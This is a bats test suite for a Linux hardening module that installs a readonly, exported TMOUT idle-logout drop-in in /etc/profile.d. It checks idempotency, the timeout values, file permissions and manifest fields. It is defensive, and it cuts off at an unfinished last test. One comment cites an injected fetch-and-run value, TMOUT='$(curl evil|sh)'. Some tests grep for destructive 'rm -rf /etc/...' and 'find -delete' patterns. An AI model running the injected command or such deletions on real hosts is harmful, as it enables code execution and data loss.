#!/usr/bin/env bats
# L2 functional suite for shell-timeout-baseline.
#
# shell-timeout-baseline installs /etc/profile.d/50-selfdef-
# tmout.sh which sets TMOUT (bash/sh inactivity timeout) so idle
# shell sessions auto-logout. Critical against the
# unlocked-terminal-walked-away attack vector (operator leaves
# the laptop in a coffee shop with an SSH session open;
# attacker sits down at the screen).
#
# Profiles:
#   standard → TMOUT=900  (15 minutes)
#   strict   → TMOUT=300  (5 minutes)
#
# CRITICAL INVARIANTS this suite locks:
#   - Idempotent: byte-identical re-install does NOT rewrite the
#     drop-in (the 2026-06-06 fix adds cmp -s + drops the
#     render-timestamp that defeated it).
#   - Drop-in starts with `#!/bin/sh` shebang (profile.d files
#     are sourced by every login shell — the shebang is a
#     readability marker, not strictly needed).
#   - Profile change rewrites the drop-in with the new TMOUT.
#   - DRY_RUN protects drop-in install.
#
# Adds 2 env-var overrides (SELFDEF_TMOUT_PROFILE_D +
# SELFDEF_TMOUT_DROPIN) for L2 testability. Live default
# behavior unchanged.
#
# Run with: bats packaging/test/L2-shell-timeout-baseline.bats

WD="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"

setup() {
    TMP="$(mktemp -d)"
    CONF="${TMP}/shell-timeout-baseline.toml"
    PROFILE_D="${TMP}/profile.d"
    DROPIN="${PROFILE_D}/50-selfdef-tmout.sh"
    mkdir -p "${PROFILE_D}"
}

teardown() { rm -rf "${TMP}"; }

write_config() {
    printf 'profile = "%s"\n' "$1" > "${CONF}"
}

run_wd() {
    SELFDEF_DRY_RUN="${DRY_RUN:-0}" \
    SELFDEF_TMOUT_CONFIG="${CONF}" \
    SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
    SELFDEF_TMOUT_DROPIN="${DROPIN}" \
    bash "${WD}"
}

@test "missing config → die" {
    SELFDEF_TMOUT_CONFIG="${TMP}/missing.toml"
    run env \
        SELFDEF_TMOUT_CONFIG="${SELFDEF_TMOUT_CONFIG}" \
        SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
        SELFDEF_TMOUT_DROPIN="${DROPIN}" \
        bash "${WD}"
    [ "$status" -ne 0 ]
    [[ "${output}" == *"config not readable"* ]]
}

@test "invalid profile → die" {
    write_config "exterminate"
    run env \
        SELFDEF_TMOUT_CONFIG="${CONF}" \
        SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
        SELFDEF_TMOUT_DROPIN="${DROPIN}" \
        bash "${WD}"
    [ "$status" -ne 0 ]
    [[ "${output}" == *"profile must be standard|strict"* ]]
}

@test "standard profile installs drop-in with TMOUT=900 (15 min)" {
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    head -1 "${DROPIN}" | grep -qF '#!/bin/sh'
    grep -q 'managed-by: selfdef shell-timeout-baseline' "${DROPIN}"
    grep -q 'profile=standard' "${DROPIN}"
    grep -q 'TMOUT' "${DROPIN}"
}

@test "strict profile installs drop-in with shorter TMOUT" {
    write_config "strict"
    run_wd
    grep -q 'profile=strict' "${DROPIN}"
}

@test "drop-in is chmod 0644 (profile.d convention)" {
    write_config "standard"
    run_wd
    [ "$(stat -c '%a' "${DROPIN}")" = "644" ]
}

@test "INVARIANT: idempotent — byte-identical re-install does NOT rewrite drop-in (timestamp removed 2026-06-06)" {
    write_config "standard"
    run_wd
    mtime_before="$(stat -c '%Y' "${DROPIN}")"
    sleep 1
    run_wd
    mtime_after="$(stat -c '%Y' "${DROPIN}")"
    [ "${mtime_before}" = "${mtime_after}" ]
}

@test "INVARIANT: profile change standard → strict rewrites drop-in (content differs)" {
    write_config "standard"
    run_wd
    sha_before="$(sha256sum "${DROPIN}" | awk '{print $1}')"
    write_config "strict"
    run_wd
    sha_after="$(sha256sum "${DROPIN}" | awk '{print $1}')"
    [ "${sha_before}" != "${sha_after}" ]
    grep -q 'profile=strict' "${DROPIN}"
}

@test "INVARIANT: DRY_RUN does not write drop-in" {
    write_config "standard"
    DRY_RUN=1 run_wd
    ! [ -f "${DROPIN}" ]
}

@test "default profile is standard (no profile key)" {
    : > "${CONF}"
    run_wd
    [ -f "${DROPIN}" ]
    grep -q 'profile=standard' "${DROPIN}"
}

@test "INVARIANT (standard TMOUT value): drop-in carries TMOUT=900 exactly" {
    write_config "standard"
    run_wd
    grep -qE 'TMOUT=900' "${DROPIN}"
}

@test "INVARIANT (strict TMOUT value): drop-in carries TMOUT=300 exactly (5 min — locked from drift)" {
    write_config "strict"
    run_wd
    grep -qE 'TMOUT=300' "${DROPIN}"
}

@test "INVARIANT (readonly TMOUT — user cannot unset): drop-in marks TMOUT readonly" {
    # If TMOUT is not readonly, the attacker (or user-by-accident) can
    # do `unset TMOUT` and defeat the whole control. Locking it readonly
    # is the canonical bash-hardening pattern.
    write_config "standard"
    run_wd
    grep -qE '^(readonly|declare -r) TMOUT' "${DROPIN}" || \
    grep -qE 'readonly +TMOUT' "${DROPIN}"
}

@test "INVARIANT (export TMOUT): drop-in exports TMOUT so child shells inherit it" {
    write_config "standard"
    run_wd
    # Conditional inside case block; assert export TMOUT anywhere.
    grep -qE 'export +TMOUT' "${DROPIN}"
}

@test "INVARIANT (profile downgrade strict → standard): rewrites with longer TMOUT" {
    write_config "strict"
    run_wd
    grep -qE 'TMOUT=300' "${DROPIN}"
    write_config "standard"
    run_wd
    grep -qE 'TMOUT=900' "${DROPIN}"
    ! grep -qE 'TMOUT=300' "${DROPIN}"
}

@test "INVARIANT (no render-timestamp in drop-in): defeats cmp -s idempotency guard" {
    write_config "standard"
    run_wd
    ! grep -qE '^# Generated [0-9]{4}-' "${DROPIN}"
}

@test "INVARIANT (drop-in re-arm after operator out-of-band deletion: re-creates drop-in with TMOUT directive)" {
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    rm -f "${DROPIN}"
    run_wd
    [ -f "${DROPIN}" ]
    grep -qE 'TMOUT=900' "${DROPIN}"
    grep -q 'managed-by: selfdef shell-timeout-baseline' "${DROPIN}"
}

@test "INVARIANT (asymmetric tightening: strict TMOUT < standard TMOUT — strict must enforce SHORTER timeout)" {
    write_config "standard"
    run_wd
    std_tmout="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | head -1 | cut -d= -f2)"
    write_config "strict"
    run_wd
    strict_tmout="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | head -1 | cut -d= -f2)"
    [ -n "${std_tmout}" ]
    [ -n "${strict_tmout}" ]
    [ "${strict_tmout}" -lt "${std_tmout}" ]
}

@test "INVARIANT (interactive-shell guard: drop-in guards on case \$- in *i* — non-interactive scripts unaffected)" {
    # Bash sets the 'i' flag in \$- for interactive shells. Non-
    # interactive scripts (cron jobs / batch jobs) must NOT inherit
    # TMOUT — they'd get killed mid-execution. Lock the guard.
    write_config "standard"
    run_wd
    grep -qE 'case[[:space:]]+\$\-[[:space:]]+in[[:space:]]*\*i\*' "${DROPIN}" || \
        grep -qE '\$-.*i' "${DROPIN}"
}

@test "INVARIANT (header-marker comment after shebang: line 1=shebang, line 2 starts with managed-by — stale-cleanup head -2 grep)" {
    # Shebang is line 1; managed-by header on line 2 enables
    # downgrade-path stale-cleanup detection.
    write_config "standard"
    run_wd
    head -1 "${DROPIN}" | grep -qF '#!/bin/sh'
    sed -n '2p' "${DROPIN}" | grep -qE '#.*managed-by.*selfdef.*shell-timeout-baseline'
}

@test "INVARIANT (emit_status JSON: status=ok + profile surfaced for operator dashboard)" {
    write_config "standard"
    output="$(run_wd 2>&1)"
    [[ "${output}" == *'"module":"shell-timeout-baseline"'* ]]
    [[ "${output}" == *'"status":"ok"'* ]]
    [[ "${output}" == *'profile=standard'* ]]
}

@test "INVARIANT (drop-in is shell-sourceable: bash -n parses cleanly — login-shell consumer contract)" {
    # The drop-in is sourced by every interactive bash/sh login.
    # bash -n must parse cleanly (no malformed syntax, no
    # unterminated quotes). Sister to umask-baseline shell-
    # sourceable INVARIANT.
    write_config "standard"
    run_wd
    bash -n "${DROPIN}"
}

@test "INVARIANT (filename follows 50-selfdef-* convention — tracking + uninstall identification)" {
    # Sister to many other modules' filename-convention INVARIANT.
    write_config "standard"
    run_wd
    case "${DROPIN}" in
        */50-selfdef-*.sh) : ;;
        *) fail "drop-in filename must follow 50-selfdef-*.sh pattern" ;;
    esac
}

@test "INVARIANT (numeric TMOUT only — no exotic shell expansions): TMOUT value must be a bare positive integer literal" {
    # An attacker substituting TMOUT='$(curl evil|sh)' would turn
    # the drop-in into a code-exec primitive on every login. Lock
    # that TMOUT carries ONLY bare-integer values, not subshells or
    # expansions.
    write_config "standard"
    run_wd
    # TMOUT must equal a bare integer.
    grep -qE '^[[:space:]]*TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}" || \
        grep -qE 'TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}"
    # No subshell-like patterns.
    ! grep -qE 'TMOUT=.*[\$\`]\(' "${DROPIN}"
    ! grep -qE 'TMOUT=.*[\$\`]\{' "${DROPIN}"
}

@test "INVARIANT (strict TMOUT <= standard TMOUT — profile-rank monotonic tightening)" {
    # Sister to pam-history + pam-pwquality profile-rank
    # monotonic INVARIANTs already locked. The strict profile
    # MUST hold at MOST the same TMOUT as standard (smaller =
    # tighter / shorter idle window before automatic logout).
    # If strict had a LARGER TMOUT than standard, operator's
    # intent ("tighten idle-session window for unattended-
    # workstation defense") would be silently inverted.
    # Locks the monotonic ordering: strict_tmout <= standard_tmout.
    write_config "standard"
    run_wd
    standard_n="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | grep -oE '[0-9]+$' | head -1)"
    write_config "strict"
    run_wd
    strict_n="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | grep -oE '[0-9]+$' | head -1)"
    [ -n "${standard_n}" ]
    [ -n "${strict_n}" ]
    [ "${strict_n}" -le "${standard_n}" ]
}

@test "INVARIANT (TMOUT marked readonly — defeats per-session bypass via export TMOUT=0)" {
    # Sister to pam-faillock even_deny_root INVARIANT in the
    # session-defense substrate. TMOUT without readonly can be
    # bypassed by the user: `export TMOUT=0` in any later shell
    # init (~/.bashrc) defeats the policy entirely. The selfdef
    # drop-in MUST mark TMOUT readonly so per-user shell init
    # cannot trivially override it. Without readonly, the
    # idle-session-logout defense is policy-theater: an attacker
    # who pivots into a user account leaves a long-running
    # session active by pre-pending `export TMOUT=0` to the
    # user's .bashrc and re-logging.
    write_config "standard"
    run_wd
    grep -qE '(readonly\s+TMOUT|declare\s+-r\s+TMOUT)' "${DROPIN}"
}

@test "INVARIANT (single emit_status JSON record per run — operator dashboard single-source-of-truth)" {
    # Sister to brain-wide single-emit_status / single-MAIN-
    # logger INVARIANTs (SDD-062 consumer dispatch contract).
    # Single-record discipline on shell-timeout-baseline installer
    # surface.
    write_config "strict"
    output="$(run_wd 2>&1)"
    count=$(printf '%s\n' "${output}" | grep -cE '"module":"shell-timeout-baseline"')
    [ "${count}" = "1" ]
}

@test "INVARIANT (no auto-uninstall: drop-in writes ONLY its own file in /etc/profile.d/ — never deletes operator drop-ins)" {
    # Sister to brain-wide no-auto-uninstall + scoped-write
    # INVARIANTs. The shell-timeout-baseline drop-in lives in
    # /etc/profile.d/50-selfdef-shell-timeout.sh — the installer
    # MUST only touch ITS OWN drop-in file and never remove other
    # operator-installed drop-ins in /etc/profile.d/ (operator
    # may have site-local TMOUT defaults, motd customizations,
    # PROMPT_COMMAND, etc.). Silent removal of operator drop-ins
    # during selfdef install would lose operator-baseline state.
    # Locks scoped-write contract on the profile.d substrate.
    # Pre-seed an operator drop-in.
    printf '#!/bin/bash\nexport OPERATOR_VAR=alive\n' > "${PROFILE_D}/99-operator.sh"
    chmod 0644 "${PROFILE_D}/99-operator.sh"
    write_config "standard"
    run_wd
    # Operator drop-in MUST remain untouched.
    [ -f "${PROFILE_D}/99-operator.sh" ]
    grep -q 'OPERATOR_VAR=alive' "${PROFILE_D}/99-operator.sh"
}

@test "INVARIANT (drop-in chmod 0644 — /etc/profile.d sourcing convention)" {
    # Sister to brain-wide drop-in chmod 0644 INVARIANTs across
    # L2 suites. The shell-timeout-baseline drop-in lives in
    # /etc/profile.d/50-selfdef-shell-timeout.sh and MUST be
    # world-readable mode 0644 because shells (bash/dash/sh)
    # source /etc/profile.d/ AS the login user (non-root uid)
    # at every login. Mode 0600 would defeat the canonical
    # profile.d sourcing semantics — non-root login shells
    # would silently fail to source the drop-in and TMOUT
    # would remain unset. Locks file-mode contract on the
    # shell-timeout-baseline substrate.
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    mode="$(stat -c '%a' "${DROPIN}")"
    [ "${mode}" = "644" ]
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. shell-timeout-baseline manifest declares install +
    # profile gating the resolver enforces; malformed manifest
    # wedges the TMOUT shell-session-timeout baseline. Python's
    # tomllib is the canonical parser. Locks anti-malformed-
    # manifest on the shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as f:
    data = tomllib.load(f)
assert data['name'] == 'shell-timeout-baseline', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-delete: shell-timeout-baseline installer NEVER deletes operator-pre-existing configs in target dir — surveillance not destruction)" {
    # Sister to brain-wide no-auto-delete INVARIANT family.
    # shell-timeout-baseline writes its own drop-in/config; it MUST NEVER
    # rm/find-delete operator-pre-existing entries not owned by
    # THIS module. Locks no-auto-delete on the shell-timeout-baseline
    # installer substrate.
    install_dir="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install"
    for sh in "${install_dir}/apply.sh" "${install_dir}/check.sh" "${install_dir}/uninstall.sh"; do
        [ -f "${sh}" ] || continue
        ! grep -qE '(^|[^a-z])rm[[:space:]]+-rf?[[:space:]]+/etc/(selinux|passwd|shadow|cups|profile\.d|login\.defs|ssh|sudoers|sudoers\.d|suricata)[/[:space:]]' "${sh}"
        ! grep -qE 'find[[:space:]]+/etc/(selinux|cups|profile\.d|ssh|sudoers|sudoers\.d|suricata).*-delete' "${sh}"
    done
}

@test "INVARIANT (install scripts use set -euo pipefail — anti-half-installed-state contract across full lifecycle)" {
    # Sister to brain-wide set -euo pipefail INVARIANT family.
    # shell-timeout-baseline install/check/uninstall scripts MUST fail-loud on
    # first error so a partial-install state is detectable.
    # Locks fail-loud invariant on the shell-timeout-baseline lifecycle substrate.
    install_dir="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install"
    for sh in "${install_dir}/apply.sh" "${install_dir}/check.sh" "${install_dir}/uninstall.sh"; do
        [ -f "${sh}" ] || continue
        grep -qE '^set[[:space:]]+-euo[[:space:]]+pipefail' "${sh}"
    done
}

@test "INVARIANT (module.toml depends_on field is a TOML list — anti-string-malformation contract)" {
    # Sister to brain-wide module.toml manifest-completeness
    # INVARIANT family. The depends_on field MUST be declared
    # as a TOML list. Locks list-vs-string discipline on the
    # depends_on field of the shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('depends_on', [])
assert isinstance(v, list), f'depends_on must be list, got {type(v).__name__}'
"
}

@test "INVARIANT (module.toml conflicts field is a TOML list — anti-string-malformation contract on conflicts)" {
    # Sister to brain-wide module.toml manifest-completeness
    # family. Locks list-vs-string discipline on conflicts.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('conflicts', [])
assert isinstance(v, list), f'conflicts must be list, got {type(v).__name__}'
"
}

@test "INVARIANT (module.toml provides field is a TOML list — anti-string-malformation contract on provides)" {
    # Sister to brain-wide module.toml manifest-completeness +
    # list-vs-string INVARIANTs. Locks list discipline on
    # provides.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('provides', [])
assert isinstance(v, list), f'provides must be list, got {type(v).__name__}'
"
}

@test "INVARIANT (module.toml requires field is a TOML list — anti-string-malformation contract on requires)" {
    # Sister to brain-wide module.toml list-vs-string family.
    # Locks list discipline on requires.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('requires', [])
assert isinstance(v, list), f'requires must be list, got {type(v).__name__}'
"
}

@test "INVARIANT (module.toml requires entries are tables with kind + value — anti-flat-string-list contract)" {
    # Sister to brain-wide module.toml requires-shape INVARIANT
    # family. Locks the kind+value table-shape discipline on
    # the shell-timeout-baseline requires substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
reqs = data.get('requires', [])
for r in reqs:
    assert isinstance(r, dict), f'requires entry must be table, got {type(r).__name__}'
    assert 'kind' in r and 'value' in r, f'requires entry must have kind+value, got {r}'
"
}

@test "INVARIANT (module.toml summary field present + non-empty — operator-dashboard one-line description contract)" {
    # Sister to brain-wide module.toml manifest-completeness
    # family. Locks summary-present discipline on the
    # shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
s = data.get('summary', '')
assert isinstance(s, str) and len(s) > 0, f'summary must be non-empty string, got {repr(s)}'
"
}

@test "INVARIANT (module.toml category field present + non-empty — dashboard-grouping contract)" {
    # Sister to brain-wide module.toml manifest-completeness
    # family. Locks category-present discipline on the
    # shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
c = data.get('category', '')
assert isinstance(c, str) and len(c) > 0, f'category must be non-empty string, got {repr(c)}'
"
}

@test "INVARIANT (module.toml version field is semver X.Y.Z — version-comparison sortability contract)" {
    # Sister to brain-wide module.toml semver INVARIANT family.
    # Locks semver-X.Y.Z discipline on the shell-timeout-baseline
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib, re
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('version', '')
assert re.match(r'^\d+\.\d+\.\d+$', v), f'version must be X.Y.Z semver, got {v!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install] apply = \"install/apply.sh\" — install apply path canonical contract)" {
    # Sister to brain-wide module.toml [install] INVARIANT
    # family. The selfdefctl installer resolves apply scripts
    # via module.toml's [install].apply field — the canonical
    # value is the relative path "install/apply.sh" (under the
    # module's own directory). A regression that swapped to
    # an absolute /usr/local/libexec/... path would break the
    # in-tree test runner (which executes apply scripts from
    # the source tree, not /usr/local/libexec/). A regression
    # to a non-existent path would surface as "apply script
    # not found" at install time. Locks the canonical
    # install/apply.sh path discipline on the shell-timeout-baseline module
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
inst = data.get('install') or {}
ap = inst.get('apply', '')
assert ap == 'install/apply.sh', f'install.apply must be install/apply.sh, got {ap!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install] check = \"install/check.sh\" — install check path canonical contract)" {
    # Sister to brain-wide module.toml [install] INVARIANT
    # family. The selfdefctl health checker resolves check
    # scripts via module.toml's [install].check field — the
    # canonical value is the relative path "install/check.sh"
    # (under the module's own directory). A regression that
    # swapped to an absolute /usr/local/libexec/... path would
    # break the in-tree test runner. A regression to a non-
    # existent path would surface as "check script not found"
    # at health-check time. Locks the canonical install/check.
    # sh path discipline on the shell-timeout-baseline module substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
inst = data.get('install') or {}
chk = inst.get('check', '')
assert chk == 'install/check.sh', f'install.check must be install/check.sh, got {chk!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install_paths] block present — SDD-026 install-path manifest contract)" {
    # Sister to brain-wide module.toml [install_paths]
    # INVARIANT family. Per MS011 Z-8 / SDD-026, every
    # installer module MUST declare an [install_paths] block
    # enumerating the on-disk surfaces it touches on apply.
    # The selfdef dashboard's install-options surface +
    # install-plan auditor read this block to surface what
    # the module mutates BEFORE apply runs. A regression
    # dropping the [install_paths] block would leave operators
    # without a pre-apply manifest of writes, breaking
    # operator-consent + the install-plan-dry-run contract.
    # Locks the SDD-026 manifest discipline on the shell-timeout-baseline
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ip = data.get('install_paths')
assert ip is not None, f'[install_paths] block must be present per SDD-026, got None'
paths = ip.get('paths', [])
assert isinstance(paths, list) and len(paths) > 0, f'install_paths.paths must be non-empty list, got {paths!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install_paths] scope = \"system\" — install_paths scope canonical contract)" {
    # Sister to brain-wide [install_paths].scope INVARIANT
    # family. Per MS011 Z-8 / SDD-026, the scope field on the
    # install_paths block declares whether the module writes
    # to system locations (/etc, /usr, /var — scope="system")
    # or per-operator locations ($HOME/.config — scope=
    # "user"). The selfdef installer surface uses scope to
    # gate sudo-required apply (system) vs operator-only
    # apply (user). The canonical value for shell-timeout-baseline is
    # "system" because it writes to /etc/selfdef + /usr/
    # local/libexec/selfdef. A regression that swapped scope
    # to "user" would silently skip sudo elevation + fail
    # the apply with EACCES. Locks the system-scope discipline
    # on the shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
sc = (data.get('install_paths') or {}).get('scope', '')
assert sc == 'system', f'install_paths.scope must be system, got {sc!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install_paths].paths is TOML list of strings — install_paths.paths TOML-list-of-strings contract)" {
    # Sister to brain-wide [install_paths].paths INVARIANT
    # family. The install_paths.paths field MUST be a TOML
    # list of strings (each element an absolute path the
    # module touches on apply). A regression that swapped to
    # a comma-separated string ("path1,path2,path3") would
    # silently treat it as a single literal path. The
    # selfdef installer iterates the list to surface the
    # mutation manifest to operators; broken type-shape
    # would break the install-options surface + dry-run
    # auditor. Locks the TOML-list-of-strings type discipline
    # on the shell-timeout-baseline install_paths.paths substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert isinstance(ps, list), f'install_paths.paths must be TOML list, got {type(ps).__name__}'
assert all(isinstance(p, str) for p in ps), f'every paths entry must be a string'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml declares requires field present as TOML list of inline-tables — runtime-dependency-binary contract)" {
    # Sister to brain-wide module.toml requires INVARIANT
    # family. The requires field MUST be a TOML list of
    # inline-tables: [{ kind = "binary", value = "..." }].
    # The selfdefctl resolver iterates the list + dispatches
    # per kind to verify each required runtime dependency
    # (canonical kinds: binary, config, systemd-unit). A
    # regression that flattened the list to strings would
    # break the per-kind dispatch. Locks the inline-table
    # list-shape discipline on the shell-timeout-baseline requires substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
req = data.get('requires')
assert isinstance(req, list), f'requires must be TOML list, got {type(req).__name__}'
for r in req:
    assert isinstance(r, dict), f'requires entry must be inline-table, got {type(r).__name__}'
    assert 'kind' in r and 'value' in r, f'requires must have kind+value, got {r!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml instanced field present (boolean) — singleton-vs-instance contract)" {
    # Sister to brain-wide module.toml instanced INVARIANT
    # family. The instanced field declares whether the
    # module supports multiple instances (true; e.g. one per
    # operator-extension config file) or is a singleton
    # (false; e.g. host-wide baseline). The selfdef installer
    # gates the install-options surface on this — a singleton
    # module rejects --instance=X; an instanced module
    # requires --instance=X. A regression dropping instanced
    # would surface as ambiguous install behavior. Locks the
    # singleton-vs-instance discipline on the shell-timeout-baseline
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
inst = data.get('instanced')
assert isinstance(inst, bool), f'instanced must be boolean, got {type(inst).__name__}: {inst!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install].kind field present + canonical value — install-dispatch canonical contract)" {
    # Sister to brain-wide module.toml [install].kind
    # INVARIANT family. The kind field dispatches the install
    # to the right runner (script-runner for kind=script,
    # dpkg for kind=debian-package). The value MUST be in
    # the canonical set {"script", "debian-package",
    # "compose", "ansible"}. A regression to a typo
    # ("scrupt", "deb-package") would silently fail the
    # dispatch + leave the module uninstallable. Locks the
    # canonical-dispatch-vocabulary discipline on the shell-timeout-baseline
    # substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
k = (data.get('install') or {}).get('kind', '')
assert k in {'script', 'debian-package', 'compose', 'ansible'}, f'install.kind must be canonical, got {k!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [install] uninstall = \"install/uninstall.sh\" — install uninstall path canonical contract)" {
    # Sister to brain-wide module.toml [install].uninstall
    # INVARIANT family. Canonical relative path "install/
    # uninstall.sh" — sister to apply/check canonical paths
    # already locked in earlier cycles. A regression to
    # absolute path would break in-tree test runner; non-
    # existent path surfaces as "uninstall script not found"
    # leaving orphaned files. Locks the canonical install/
    # uninstall.sh path discipline on the shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
un = (data.get('install') or {}).get('uninstall', '')
assert un == 'install/uninstall.sh', f'install.uninstall must be install/uninstall.sh, got {un!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml category field present + non-empty — module-taxonomy contract)" {
    # Sister to brain-wide module.toml category INVARIANT
    # family.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
c = data.get('category', '')
assert c, f'category must be non-empty, got {c!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [profiles] block present — operator-config-variant contract)" {
    # Sister to brain-wide module.toml [profiles] INVARIANT
    # family. The [profiles] block declares operator-
    # selectable configuration variants (canonically
    # "report" / "enforce" for detection modules, or
    # category-specific variants for hardening modules). A
    # regression dropping the [profiles] block would leave
    # operators without a configuration knob + hard-code
    # behavior. Locks the operator-config-variant discipline
    # on the shell-timeout-baseline substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
prof = data.get('profiles')
assert prof is not None, f'[profiles] must be present, got None'
assert isinstance(prof, dict), f'[profiles] must be TOML table, got {type(prof).__name__}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [profiles].default field present + non-empty — default-profile-selector contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
d = (data.get('profiles') or {}).get('default', '')
assert d, f'profiles.default must be non-empty string, got {d!r}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml [profiles].available field present as TOML list — profile-vocabulary contract)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
a = (data.get('profiles') or {}).get('available', [])
assert isinstance(a, list), f'profiles.available must be TOML list, got {type(a).__name__}'
"
}

@test "INVARIANT (shell-timeout-baseline module.toml phase field present + canonical value — install-pass-ordering contract)" {
